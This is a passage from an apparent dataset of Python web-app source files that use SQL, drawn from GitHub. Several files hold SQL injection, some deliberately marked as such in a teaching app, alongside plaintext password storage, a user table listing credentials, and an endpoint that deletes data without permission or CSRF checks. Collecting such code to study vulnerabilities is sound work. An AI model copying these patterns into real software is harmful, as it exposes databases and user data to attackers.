        "source": "from marshmallow import Schema,fields\nimport ipaddress\n\n\"\"\"\nschema.dump = used for converting the automap.faqs object to a dictionary good for returning ie cleaning unnecessary fields\nschema.validate(request.get_json(force=True)) = used to validate if all the data required for updating and creating the faq is present.4\ndump_only = Fields that we need to display when returning the item\nload_only = Fields that we need only while dumping from python objects. We use it to stop marshmallow from dumping it while using dump()\n\"\"\"\ndef ip_test(ip):\n        try:\n            ipaddress.ip_address(ip)\n            return True\n        except ValueError:\n            return False\n\nclass Faq_Schema(Schema):\n    id = fields.Integer()\n    question = fields.String(required=True)\n    answer = fields.String(required=True)\n    display = fields.Boolean(required=True)\n    priority = fields.Integer(required=True)\n    placement = fields.String(required=True)\n    user_id = fields.Integer()\n\nclass Announcement_Schema(Schema):\n    id = fields.Integer()\n    title = fields.String(required=True)\n    description = fields.String(required=True)\n    pinned = fields.Boolean(required=True)\n    created_at = fields.DateTime(dump_only=True)\n    updated_at = fields.DateTime(dump_only=True)\n\nclass Hardware_Schema(Schema):\n    id = fields.Integer()\n    item = fields.String(required=True)\n    lender = fields.String(required=True)\n    quantity = fields.String(required=True)\n    created_at = fields.DateTime(load_only=True)\n    updated_at = fields.DateTime(load_only=True)\n\nclass Sponsor_Schema(Schema):\n    id = fields.Integer()\n    name = fields.String(required=True)\n    level = fields.String(required=True)\n    url = fields.URL(required=True)\n    logo_svg_light = fields.String(required=True)\n    logo_svg_dark = fields.String()\n    logo_png_light = fields.String(required=True)\n    logo_png_dark = fields.String()\n    created_at = fields.DateTime(load_only=True)\n    updated_at = fields.DateTime(load_only=True)\n\nclass Schedule_Schema(Schema):\n    id = fields.Integer()\n    title = fields.String(required=True)\n    description = fields.String(required=True)\n    time = fields.DateTime(required=True)\n    location = fields.String(required=True)\n    created_at = fields.DateTime(load_only=True)\n    updated_at = fields.DateTime(dump_only=True)\n\nclass Application_Schema(Schema):\n    id = fields.Integer()\n    user_id = fields.Integer(required=True  )\n    birth_day = fields.Integer(required=True)\n    birth_month = fields.Integer(required=True)\n    birth_year = fields.Integer(required=True)\n    education = fields.String(required=True)\n    university = fields.String()\n    other_university = fields.String()\n    travel_origin = fields.String()\n    graduation_season = fields.String(required=True)\n    graduation_year = fields.Integer(required=True)\n    major = fields.List(fields.String)\n    hackathons = fields.Integer(required=True)\n    github = fields.URL()\n    linkedin = fields.URL()\n    website = fields.URL()\n    devpost = fields.URL()\n    other_link = fields.URL()\n    statement = fields.String()\n    created_at = fields.DateTime()\n    updated_at = fields.DateTime()\n    race = fields.List(fields.String)\n    gender = fields.String()\n    outside_north_america = fields.String()\n    status = fields.String()\n    accepted_date = fields.DateTime()\n\nclass User_Schema(Schema):\n    id = fields.Integer()\n    email = fields.Email(required=True)\n    encrypted_password = fields.String(required=True)\n    reset_password_token = fields.String()\n    reset_password_sent_at = fields.DateTime()\n    remember_created_at = fields.DateTime()\n    sign_in_count = fields.Integer()\n    current_sign_in_at = fields.DateTime()\n    last_sign_in_at = fields.DateTime()\n    current_sign_in_ip = fields.String(validate=ip_test)\n    last_sign_in_ip = fields.String(validate=ip_test)\n    created_at = fields.DateTime(required=True)\n    updated_at = fields.DateTime(required=True)\n    auth_token =fields.String()\n    confirmation_token = fields.String()\n    confirmed_at = fields.DateTime()\n    confirmation_sent_at = fields.DateTime()\n    role = fields.Integer()\n    first_name = fields.String()\n    last_name = fields.String()\n    checked_in = fields.Boolean(required=True)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/SpartaHack/SpartaHack-API/blob/b0d71ba8da8aa1c1c7e394ea63cf2c0b95443f25",
        "file_path": "/resources/users.py",
        "source": "from flask_restful import Resource\nfrom werkzeug.exceptions import BadRequest\nfrom flask import request,jsonify,g\nfrom datetime import datetime\nfrom sqlalchemy import exists,and_\nfrom sqlalchemy.orm.exc import NoResultFound\nfrom common.json_schema import User_Schema\nfrom common.utils import headers,is_logged_in,has_admin_privileges\nfrom common.utils import bad_request,unauthorized,forbidden,not_found,internal_server_error,unprocessable_entity,conflict\n\nclass Users_RUD(Resource):\n    def get(self,user_id):\n        pass\n\n    def put(self,user_id):\n        pass\n\n    def delete(self,user_id):\n        pass\n\nclass Users_CR(Resource):\n    def get(self):\n        pass\n\n    def post(self):\n        pass",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/NeveuxSolutions/CyberEscape/blob/70ca3f7c8851975910855dffa54d9a4010975485",
        "file_path": "/app.py",
        "source": "from flask import Flask, render_template, url_for, flash, redirect, request\nfrom flask_sqlalchemy import SQLAlchemy \n\napp = Flask(__name__, static_folder='static', static_url_path='')\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.sqlite3'\napp.config['SECRET_KEY'] = \"random string\"\ndb = SQLAlchemy(app)\n\nclass User(db.Model):\n\tid = db.Column(db.Integer, primary_key=True)\n\temail = db.Column(db.String(50))\n\tpassword = db.Column(db.String(20))\n\n\tdef __init__(self, email, password):\n\t\tself.email = email\n\t\tself.password = password\n\n@app.route('/')\ndef home():\n\treturn render_template('home.html')\n\n@app.route('/tables')\ndef tables():\n\treturn render_template('tables.html', User=User.query.all())\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n\tif request.method == 'POST':\n\t\tuser = User(request.form['email'], request.form['password'])\n\t\tdb.session.add(user)\n\t\tdb.session.commit()\n\t\treturn redirect(url_for('tables'))\n\treturn render_template('login.html')\n\n# Drop/Create all Tables\ndb.drop_all()\ndb.create_all()\n\nif __name__ == '__main__':\n\tapp.run(debug = True)\n\t",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/anob3it/unsafe-web/blob/2a34e5558f2d6b12fd8745d6fa0c9b1b72761bef",
        "file_path": "/unsafe/db/note.py",
        "source": "from dataclasses import dataclass\nfrom typing import Optional, List, Union, Any, Tuple\n\nfrom . import db\n\n\n@dataclass\nclass Note:\n    note_id: Optional[int]\n    user_id: int\n    content: str\n    created_at: Optional[str] = None\n    updated_at: Optional[str] = None\n\n    def __json__(self, *args):\n        return vars(self)\n\n\ndef find_notes(conn,\n               *,\n               user_id: Optional[int] = None,\n               from_date: Optional[str] = None,\n               to_date: Optional[str] = None,\n               search: Optional[str] = None) -> List[Note]:\n    conditions = []\n    params: Union[tuple,Tuple[Any]] = ()\n\n    # SQL injection here\n    if user_id:\n        conditions.append(f'user_id = {user_id}')\n\n    # SQL injection safe\n    if from_date:\n        conditions.append('updated_at >= ?')\n        params += (from_date,)\n\n    # SQL injection\n    if to_date:\n        conditions.append(f\"updated_at <= '{to_date}'\")\n\n    # SQL-injection safe - but does not handle percent in search string\n    if search:\n        conditions.append(f\"LOWER(content) LIKE ?\")\n        params += (f'%{search.lower()}%',)\n\n    sql = ('SELECT note_id, user_id, content, created_at, updated_at '\n           ' FROM note' +  # noqa\n           ' WHERE ' + ' AND '.join(conditions) + ' ORDER BY updated_at DESC')\n\n    with db.cursor(conn) as cur:\n        return db.fetchall(cur, Note, sql, params)\n\n\ndef _find_note(cur, note_id):\n    # SQL injection here\n    return db.fetchone(cur, Note,\n                       f'SELECT note_id, user_id, content,'\n                       f' created_at, updated_at'\n                       f' FROM note WHERE note_id = {note_id}',\n                       ())\n\n\ndef find_note(conn, note_id) -> Optional[Note]:\n    with db.cursor(conn) as cur:\n        return _find_note(cur, note_id)\n\n\ndef delete_note(conn, note_id):\n    with db.cursor(conn) as cur:\n        # SQL injection here\n        cur.execute(f'DELETE from note WHERE note_id = {note_id}')\n\n\ndef save_note(conn, note: Note) -> Note:\n    with db.cursor(conn) as cur:\n        if note.note_id:\n            cur.execute(\n                'UPDATE note SET content = ?, updated_at = CURRENT_TIMESTAMP'\n                ' WHERE note_id = ?',\n                (note.content, note.note_id))\n        else:\n            cur.execute('INSERT INTO note(user_id, content) VALUES(?, ?)',\n                        (note.user_id, note.content))\n            note.note_id = cur.lastrowid\n        new_note = _find_note(cur, note.note_id)\n\n    return new_note\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/anob3it/unsafe-web/blob/2a34e5558f2d6b12fd8745d6fa0c9b1b72761bef",
        "file_path": "/unsafe/notes.py",
        "source": "from pyramid.httpexceptions import HTTPFound, HTTPNoContent\nfrom pyramid.request import Request\nfrom pyramid.security import Allow\nfrom pyramid.view import view_config\n\nfrom . import db\nfrom .app import RootContextFactory\nfrom .embed import embeddable\n\n\nclass NotesFactory(RootContextFactory):\n\n    def __getitem__(self, note_id):\n        note = db.note.find_note(self.request.db, note_id)\n        if note:\n            return NoteResource(note)\n\n        raise KeyError(note_id)\n\n\nclass NoteResource:\n    def __init__(self, note: db.note.Note):\n        self.note = note\n\n    @property\n    def __acl__(self):\n        return [\n            (Allow, self.note.user_id, ('view', 'edit'))\n        ]\n\n\n###############################################################################\n# Notes\n###############################################################################\n\n@view_config(route_name='note-action',\n             request_method=('GET', 'POST'),\n             request_param='action=delete')\ndef delete_note_action(request):\n    \"\"\"Unsafe delete of note.\n\n    - Deletes as a side effect of GET request\n    - Does not validate arguments (SQL injection due to unsafe implementation\n      of delete_note)\n    - Does not check permissions\n    - Vulnerable to CSRF\n    \"\"\"\n\n    db.note.delete_note(request.db, request.params['id'])\n    return HTTPNoContent()\n\n\n@view_config(route_name='notes', permission='view',\n             renderer='notes/list-notes.jinja2')\ndef notes_listing(request):\n    search = request.params.get('search', '')\n    from_date = request.params.get('from', '')\n    to_date = request.params.get('to', '')\n    notes = db.note.find_notes(request.db,\n                               user_id=request.user.user_id,\n                               from_date=from_date,\n                               to_date=to_date,\n                               search=search)\n\n    return {\n        'notes': notes,\n        'from': from_date,\n        'to': to_date,\n        'search': search\n    }\n\n\n@view_config(route_name='note', permission='edit', request_method='GET',\n             renderer='notes/edit-note.jinja2', decorator=embeddable)\ndef edit_note(context: NoteResource, request: Request):\n    return dict(title='Redigera anteckning',\n                note=context.note)\n\n\n@view_config(route_name='note', permission='edit', request_method='POST',\n             renderer='notes/edit-note.jinja2', decorator=embeddable)\ndef save_note(context: NoteResource, request: Request):\n    _save_or_create_note(context.note, request)\n    return HTTPFound(location=request.route_url('notes'))\n\n\n@view_config(route_name='new-note', permission='edit',\n             renderer='notes/edit-note.jinja2', require_csrf=True,\n             decorator=embeddable)\ndef create_note(request: Request):\n    note = db.note.Note(None,\n                        user_id=request.user.user_id,\n                        content=request.params.get('note', ''))\n    if request.method == 'POST':\n        _save_or_create_note(note, request)\n        return HTTPFound(location=request.route_url('notes'))\n\n    return dict(title='Ny anteckning',\n                note=note)\n\n\ndef _save_or_create_note(note: db.note.Note, request: Request):\n    content: str = request.params['note']\n    note.content = content.replace('\\r', '')\n    return db.note.save_note(request.db, note)\n\n\ndef includeme(config):\n    config.add_route('notes', '/notes', factory=NotesFactory)\n    config.add_route('new-note', '/notes/new')\n    config.add_route('note',\n                     pattern='/notes/{note}',\n                     traverse='/{note}',\n                     factory=NotesFactory)\n\n    config.add_route('note-action', '/api/notes')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/apseftis86/python_schoolwork/blob/26a2028f1def42da77f69f0e75e65f357bb7008c",
        "file_path": "/flask/flask_mysql/users/mysqlconnection.py",
        "source": "# a cursor is the object we use to interact with the database\nimport pymysql.cursors\n\n\n# this class will give us an instance of a connection to our database\nclass MySQLConnection:\n    def __init__(self, db):\n        connection = pymysql.connect(host='localhost',\n                                     user='root',  # change the user and password as needed\n                                     password='',\n                                     db=db,\n                                     charset='utf8mb4',\n                                     cursorclass=pymysql.cursors.DictCursor,\n                                     autocommit=True)\n        # establish the connection to the database\n        self.connection = connection\n\n    # the method to query the database\n    def query_db(self, query, data=None):\n        with self.connection.cursor() as cursor:\n            try:\n                query = cursor.mogrify(query, data)\n                print(\"Running Query:\", query)\n\n                executable = cursor.execute(query, data)\n                if query.lower().find(\"insert\") >= 0:\n                    # INSERT queries will return the ID NUMBER of the row inserted\n                    self.connection.commit()\n                    return cursor.lastrowid\n                elif query.lower().find(\"select\") >= 0:\n                    # SELECT queries will return the data from the database as a LIST OF DICTIONARIES\n                    result = cursor.fetchall()\n                    return result\n                else:\n                    # UPDATE and DELETE queries will return nothing\n                    self.connection.commit()\n            except Exception as e:\n                # if the query fails the method will return FALSE\n                print(\"Something went wrong\", e)\n                return False\n            finally:\n                # close the connection\n                self.connection.close()\n            # connectToMySQL receives the database we're using and uses it to create an instance of MySQLConnection\n\n\ndef connectToMySQL(db):\n    return MySQLConnection(db)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/apseftis86/python_schoolwork/blob/26a2028f1def42da77f69f0e75e65f357bb7008c",
        "file_path": "/flask/flask_mysql/users/server.py",
        "source": "from flask import Flask, render_template, redirect, request\nfrom mysqlconnection import connectToMySQL  # import the function that will return an instance of a connection\n\napp = Flask(__name__)\n\n@app.route('/users')\ndef get_users():\n    mysql = connectToMySQL(\"users_db\")\n    users = mysql.query_db(\"SELECT * FROM users;\")\n    return render_template('index.html', users=users)\n\n@app.route('/users/<id>')\ndef show_user(id):\n    mysql = connectToMySQL(\"users_db\")\n    user = mysql.query_db(\"SELECT * FROM users WHERE id = {};\".format(id))\n    return render_template('user.html', user=user[0])\n\n@app.route('/users/new', methods=['GET', 'POST'])\ndef add_user():\n    if request.method == 'POST':\n        mysql = connectToMySQL(\"users_db\")\n        query = \"INSERT INTO users (first_name, last_name, email, description, created_at) VALUES (%(fn)s, %(ln)s, %(e)s, %(d)s, now());\"\n        data = {\n            \"fn\": request.form['first_name'],\n            \"ln\": request.form['last_name'],\n            \"e\": request.form['email'],\n            \"d\": request.form['description'],\n        }\n        new_user = mysql.query_db(query, data)\n        return redirect(f'/users/{new_user}')\n    else:\n        return render_template('edit.html', user=None)\n\n@app.route('/users/<id>/edit', methods=['GET', 'POST'])\ndef edit_user(id):\n   user_id = id\n   mysql = connectToMySQL(\"users_db\")\n   if request.method == 'POST':\n       query = \"UPDATE users SET first_name = %(fn)s, last_name = %(ln)s, email= %(e)s, description = %(d)s, updated_at = now() WHERE id = \" + user_id + \";\"\n       data = {\n           \"fn\" : request.form['first_name'],\n           \"ln\" : request.form['last_name'],\n           \"e\" : request.form['email'],\n           \"d\" : request.form['description'],\n       }\n       mysql.query_db(query, data)\n       return redirect('/users/{}'.format(user_id))\n   else:\n       user = mysql.query_db(\"SELECT * FROM users WHERE id = \" + user_id + \";\")\n       return render_template('edit.html', user=user[0])\n\n\n@app.route('/users/<id>/destroy')\ndef delete_user(id):\n   user_id = id\n   mysql = connectToMySQL(\"users_db\")\n   query = \"DELETE from users WHERE id = \" + user_id + \";\"\n   deleted_user = mysql.query_db(query)\n   return redirect('/users')\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/FAForever/faf-python-api/blob/58c44c6f1e84e20fc08d37c1536455c4e759f16c",
        "file_path": "/api/achievements.py",
        "source": "from flask import request\n\nfrom api import *\n\nimport faf.db as db\n\nSELECT_ACHIEVEMENTS_QUERY = \"\"\"SELECT\n                    ach.id,\n                    ach.type,\n                    ach.total_steps,\n                    ach.revealed_icon_url,\n                    ach.unlocked_icon_url,\n                    ach.initial_state,\n                    ach.experience_points,\n                    COALESCE(name_langReg.value, name_lang.value, name_def.value) as name,\n                    COALESCE(desc_langReg.value, desc_lang.value, desc_def.value) as description\n                FROM achievement_definitions ach\n                LEFT OUTER JOIN messages name_langReg\n                    ON ach.name_key = name_langReg.key\n                        AND name_langReg.language = %(language)s\n                        AND name_langReg.region = %(region)s\n                LEFT OUTER JOIN messages name_lang\n                    ON ach.name_key = name_lang.key\n                        AND name_lang.language = %(language)s\n                LEFT OUTER JOIN messages name_def\n                    ON ach.name_key = name_def.key\n                        AND name_def.language = 'en'\n                        AND name_def.region = 'US'\n                LEFT OUTER JOIN messages desc_langReg\n                    ON ach.description_key = desc_langReg.key\n                        AND desc_langReg.language = %(language)s\n                        AND desc_langReg.region = %(region)s\n                LEFT OUTER JOIN messages desc_lang\n                    ON ach.description_key = desc_lang.key\n                        AND desc_lang.language = %(language)s\n                LEFT OUTER JOIN messages desc_def\n                    ON ach.description_key = desc_def.key\n                        AND desc_def.language = 'en'\n                        AND desc_def.region = 'US'\"\"\"\n\n\n@app.route('/achievements')\ndef achievements_list():\n    \"\"\"Lists all achievement definitions.\n\n    HTTP Parameters::\n\n        language    string  The preferred language to use for strings returned by this method\n        region      string  The preferred region to use for strings returned by this method\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"updated_achievements\": [\n                {\n                  \"id\": string,\n                  \"name\": string,\n                  \"description\": string,\n                  \"type\": string,\n                  \"total_steps\": integer,\n                  \"initial_state\": string,\n                  \"experience_points\": integer,\n                  \"revealed_icon_url\": string,\n                  \"unlocked_icon_url\": string\n                }\n              ]\n            }\n    \"\"\"\n    language = request.args.get('language', 'en')\n    region = request.args.get('region', 'US')\n\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n        cursor.execute(SELECT_ACHIEVEMENTS_QUERY + \" ORDER BY `order` ASC\",\n                       {\n                           'language': language,\n                           'region': region\n                       })\n\n        return flask.jsonify(items=cursor.fetchall())\n\n\n@app.route('/achievements/<achievement_id>')\ndef achievements_get(achievement_id):\n    \"\"\"Gets an achievement definition.\n\n    HTTP Parameters::\n\n        language    string  The preferred language to use for strings returned by this method\n        region      string  The preferred region to use for strings returned by this method\n\n    :param achievement_id: ID of the achievement to get\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"id\": string,\n              \"name\": string,\n              \"description\": string,\n              \"type\": string,\n              \"total_steps\": integer,\n              \"initial_state\": string,\n              \"experience_points\": integer,\n              \"revealed_icon_url\": string,\n              \"unlocked_icon_url\": string\n            }\n    \"\"\"\n    language = request.args.get('language', 'en')\n    region = request.args.get('region', 'US')\n\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n        cursor.execute(SELECT_ACHIEVEMENTS_QUERY + \"WHERE ach.id = %(achievement_id)s\",\n                       {\n                           'language': language,\n                           'region': region,\n                           'achievement_id': achievement_id\n                       })\n\n        return cursor.fetchone()\n\n\n@app.route('/achievements/<achievement_id>/increment', methods=['POST'])\ndef achievements_increment(achievement_id):\n    \"\"\"Increments the steps of the achievement with the given ID for the currently authenticated player.\n\n    HTTP Parameters::\n\n        player_id    integer ID of the player to increment the achievement for\n        steps        string  The number of steps to increment\n\n    :param achievement_id: ID of the achievement to increment\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"current_steps\": integer,\n              \"current_state\": string,\n              \"newly_unlocked\": boolean,\n            }\n    \"\"\"\n    # FIXME get player ID from OAuth session\n    player_id = int(request.form.get('player_id'))\n    steps = int(request.form.get('steps', 1))\n\n    return flask.jsonify(increment_achievement(achievement_id, player_id, steps))\n\n\n@app.route('/achievements/<achievement_id>/setStepsAtLeast', methods=['POST'])\ndef achievements_set_steps_at_least(achievement_id):\n    \"\"\"Sets the steps of an achievement. If the steps parameter is less than the current number of steps\n     that the player already gained for the achievement, the achievement is not modified.\n     This function is NOT an endpoint.\"\"\"\n    # FIXME get player ID from OAuth session\n    player_id = int(request.form.get('player_id'))\n    steps = int(request.form.get('steps', 1))\n\n    return flask.jsonify(set_steps_at_least(achievement_id, player_id, steps))\n\n\n@app.route('/achievements/<achievement_id>/unlock', methods=['POST'])\ndef achievements_unlock(achievement_id):\n    \"\"\"Unlocks an achievement for the currently authenticated player.\n\n    HTTP Parameters::\n\n        player_id    integer ID of the player to unlock the achievement for\n\n    :param achievement_id: ID of the achievement to unlock\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"newly_unlocked\": boolean,\n            }\n    \"\"\"\n    # FIXME get player ID from OAuth session\n    player_id = int(request.form.get('player_id'))\n\n    return flask.jsonify(unlock_achievement(achievement_id, player_id))\n\n\n@app.route('/achievements/<achievement_id>/reveal', methods=['POST'])\ndef achievements_reveal(achievement_id):\n    \"\"\"Reveals an achievement for the currently authenticated player.\n\n    HTTP Parameters::\n\n        player_id    integer ID of the player to reveal the achievement for\n\n    :param achievement_id: ID of the achievement to reveal\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"current_state\": string,\n            }\n    \"\"\"\n    # FIXME get player ID from OAuth session\n    player_id = int(request.form.get('player_id'))\n\n    return flask.jsonify(reveal_achievement(achievement_id, player_id))\n\n\n@app.route('/achievements/updateMultiple', methods=['POST'])\ndef achievements_update_multiple():\n    \"\"\"Updates multiple achievements for the currently authenticated player.\n\n    HTTP Body:\n        In the request body, supply data with the following structure::\n\n            {\n              \"player_id\": integer,\n              \"updates\": [\n                \"achievement_id\": string,\n                \"update_type\": string,\n                \"steps\": integer\n              ]\n            }\n\n        ``updateType`` being one of \"REVEAL\", \"INCREMENT\" or \"UNLOCK\"\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"updated_achievements\": [\n                \"achievement_id\": string,\n                \"current_state\": string,\n                \"current_steps\": integer,\n                \"newly_unlocked\": boolean,\n              ],\n            }\n    \"\"\"\n    # FIXME get player ID from OAuth session\n    player_id = request.json['player_id']\n\n    updates = request.json['updates']\n\n    result = dict(updated_achievements=[])\n\n    for update in updates:\n        achievement_id = update['achievement_id']\n        update_type = update['update_type']\n\n        update_result = dict(achievement_id=achievement_id)\n\n        if update_type == 'REVEAL':\n            reveal_result = reveal_achievement(achievement_id, player_id)\n            update_result['current_state'] = reveal_result['current_state']\n            update_result['current_state'] = 'REVEALED'\n        elif update_type == 'UNLOCK':\n            unlock_result = unlock_achievement(achievement_id, player_id)\n            update_result['newly_unlocked'] = unlock_result['newly_unlocked']\n            update_result['current_state'] = 'UNLOCKED'\n        elif update_type == 'INCREMENT':\n            increment_result = increment_achievement(achievement_id, player_id, update['steps'])\n            update_result['current_steps'] = increment_result['current_steps']\n            update_result['current_state'] = increment_result['current_state']\n            update_result['newly_unlocked'] = increment_result['newly_unlocked']\n        elif update_type == 'SET_STEPS_AT_LEAST':\n            set_steps_at_least_result = set_steps_at_least(achievement_id, player_id, update['steps'])\n            update_result['current_steps'] = set_steps_at_least_result['current_steps']\n            update_result['current_state'] = set_steps_at_least_result['current_state']\n            update_result['newly_unlocked'] = set_steps_at_least_result['newly_unlocked']\n\n        result['updated_achievements'].append(update_result)\n\n    return result\n\n\n@app.route('/players/<int:player_id>/achievements')\ndef achievements_list_player(player_id):\n    \"\"\"Lists the progress of achievements for a player.\n\n    :param player_id: ID of the player.\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"items\": [\n                {\n                  \"achievement_id\": string,\n                  \"state\": string,\n                  \"current_steps\": integer,\n                  \"create_time\": long,\n                  \"update_time\": long\n                }\n              ]\n            }\n    \"\"\"\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n        cursor.execute(\"\"\"SELECT\n                            achievement_id,\n                            current_steps,\n                            state,\n                            UNIX_TIMESTAMP(create_time) as create_time,\n                            UNIX_TIMESTAMP(update_time) as update_time\n                        FROM player_achievements\n                        WHERE player_id = '%s'\"\"\" % player_id)\n\n        return flask.jsonify(items=cursor.fetchall())\n\n\ndef increment_achievement(achievement_id, player_id, steps):\n    steps_function = lambda current_steps, new_steps: current_steps + new_steps\n    return update_steps(achievement_id, player_id, steps, steps_function)\n\n\ndef set_steps_at_least(achievement_id, player_id, steps):\n    steps_function = lambda current_steps, new_steps: max(current_steps, new_steps)\n    return update_steps(achievement_id, player_id, steps, steps_function)\n\n\ndef update_steps(achievement_id, player_id, steps, steps_function):\n    \"\"\"Increments the steps of an achievement. This function is NOT an endpoint.\n\n    :param achievement_id: ID of the achievement to increment\n    :param player_id: ID of the player to increment the achievement for\n    :param steps: The number of steps to increment\n    :param steps_function: The function to use to calculate the new steps value. Two parameters are passed; the current\n    step count and the parameter ``steps``\n\n    :return:\n        If successful, this method returns a dictionary with the following structure::\n\n            {\n              \"current_steps\": integer,\n              \"current_state\": string,\n              \"newly_unlocked\": boolean,\n            }\n    \"\"\"\n    achievement = achievements_get(achievement_id)\n\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n        cursor.execute(\"\"\"SELECT\n                            current_steps,\n                            state\n                        FROM player_achievements\n                        WHERE achievement_id = %s AND player_id = %s\"\"\",\n                       (achievement_id, player_id))\n\n        player_achievement = cursor.fetchone()\n\n        new_state = 'REVEALED'\n        newly_unlocked = False\n\n        current_steps = player_achievement['current_steps'] if player_achievement else 0\n        new_current_steps = steps_function(current_steps, steps)\n\n        if new_current_steps >= achievement['total_steps']:\n            new_state = 'UNLOCKED'\n            new_current_steps = achievement['total_steps']\n            newly_unlocked = player_achievement['state'] != 'UNLOCKED' if player_achievement else True\n\n        cursor.execute(\"\"\"INSERT INTO player_achievements (player_id, achievement_id, current_steps, state)\n                        VALUES\n                            (%(player_id)s, %(achievement_id)s, %(current_steps)s, %(state)s)\n                        ON DUPLICATE KEY UPDATE\n                            current_steps = VALUES(current_steps),\n                            state = VALUES(state)\"\"\",\n                       {\n                           'player_id': player_id,\n                           'achievement_id': achievement_id,\n                           'current_steps': new_current_steps,\n                           'state': new_state,\n                       })\n\n    return dict(current_steps=new_current_steps, current_state=new_state, newly_unlocked=newly_unlocked)\n\n\ndef unlock_achievement(achievement_id, player_id):\n    \"\"\"Unlocks a standard achievement. This function is NOT an endpoint.\n\n    :param achievement_id: ID of the achievement to unlock\n    :param player_id: ID of the player to unlock the achievement for\n\n    :return:\n        If successful, this method returns a dictionary with the following structure::\n\n            {\n              \"newly_unlocked\": boolean,\n            }\n    \"\"\"\n    newly_unlocked = False\n\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n\n        cursor.execute('SELECT type FROM achievement_definitions WHERE id = %s', achievement_id)\n        achievement = cursor.fetchone()\n        if achievement['type'] != 'STANDARD':\n            raise InvalidUsage('Only standard achievements can be unlocked directly', status_code=400)\n\n        cursor.execute(\"\"\"SELECT\n                            state\n                        FROM player_achievements\n                        WHERE achievement_id = %s AND player_id = %s\"\"\",\n                       (achievement_id, player_id))\n\n        player_achievement = cursor.fetchone()\n\n        new_state = 'UNLOCKED'\n        newly_unlocked = not player_achievement or player_achievement['state'] != 'UNLOCKED'\n\n        cursor.execute(\"\"\"INSERT INTO player_achievements (player_id, achievement_id, state)\n                        VALUES\n                            (%(player_id)s, %(achievement_id)s, %(state)s)\n                        ON DUPLICATE KEY UPDATE\n                            state = VALUES(state)\"\"\",\n                       {\n                           'player_id': player_id,\n                           'achievement_id': achievement_id,\n                           'state': new_state,\n                       })\n\n    return dict(newly_unlocked=newly_unlocked)\n\n\ndef reveal_achievement(achievement_id, player_id):\n    \"\"\"Reveals an achievement.\n\n    :param achievement_id: ID of the achievement to unlock\n    :param player_id: ID of the player to reveal the achievement for\n\n    :return:\n        If successful, this method returns a response body with the following structure::\n\n            {\n              \"current_state\": string,\n            }\n    \"\"\"\n    with db.connection:\n        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)\n        cursor.execute(\"\"\"SELECT\n                            state\n                        FROM player_achievements\n                        WHERE achievement_id = %s AND player_id = %s\"\"\",\n                       (achievement_id, player_id))\n\n        player_achievement = cursor.fetchone()\n\n        new_state = player_achievement['state'] if player_achievement else 'REVEALED'\n\n        cursor.execute(\"\"\"INSERT INTO player_achievements (player_id, achievement_id, state)\n                        VALUES\n                            (%(player_id)s, %(achievement_id)s, %(state)s)\n                        ON DUPLICATE KEY UPDATE\n                            state = VALUES(state)\"\"\",\n                       {\n                           'player_id': player_id,\n                           'achievement_id': achievement_id,\n                           'state': new_state,\n                       })\n\n    return dict(current_state=new_state)\n",
        "dataset": "plain_sql.json"
    }
]